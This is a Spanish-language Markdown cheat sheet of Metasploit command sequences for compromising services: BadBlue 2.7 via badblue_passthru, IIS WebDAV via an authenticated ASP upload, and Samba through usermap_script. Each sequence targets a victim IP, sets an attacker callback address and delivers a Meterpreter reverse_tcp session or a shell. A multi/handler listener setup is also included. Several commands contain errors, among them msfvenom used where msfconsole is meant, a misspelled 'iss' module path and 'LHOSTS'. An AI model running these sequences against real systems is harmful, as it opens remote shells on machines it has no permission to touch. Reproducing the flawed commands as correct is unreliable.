# Exploit con Metasploit

Tags: #Metasploit #WebDav #BadBlue #SMB 

## HTTP 80

## BadBlue 2.7 

```bash 
# Usaremos el BufferOverFlow para entrar a la maquina victima con 'Meterpreter'
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search badblue 2.7                                    
	❯ use exploit/windows/http/badblue_passthru             # Usamos el exploit 
	❯ info
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ set LHOST ens33                                       # Colocamos el puerto de nuestra maquina de atacante
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el payload a usar 
	❯ options
	❯ run
```

## WebDAV

```bash 
# Si ya tenemos un archivo malicioso hecho en msfvenom listo para ejecutar en el servidor victima, podemos hacer lo siguiente y nos pondriamos en 'listening'
❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 1234
	❯ run
```

```bash 
# Nos proveera una sesion de Meterpreter en un Webdav
❯ msfvenom -q                     # q = Quitar el banner de inicio

	❯ search iis upload                                  # Buscamos el exploit a usar
	❯ use exploit/windows/iss/iss_webdav_upload_asp	   # Usamos el exploit
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 1234
	❯ set HttpUsername <user>                            # Debemos de colocar credenciales validas 
	❯ set HttpPassword <passwd>
	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
	❯ set PATH /webdav/metasploit.asp                    # Colocamos la ruta y el nombre del archivo 
	❯ exploit
```

## Puerto 445 SMB

```bash 
# Algunas versiones con exploit (3.0.20)
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search samba 
	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ set LHOSTS 192.168.1.157                     # Colocamos la IP de nuestra maquina 
	❯ run 
	❯ shell 
```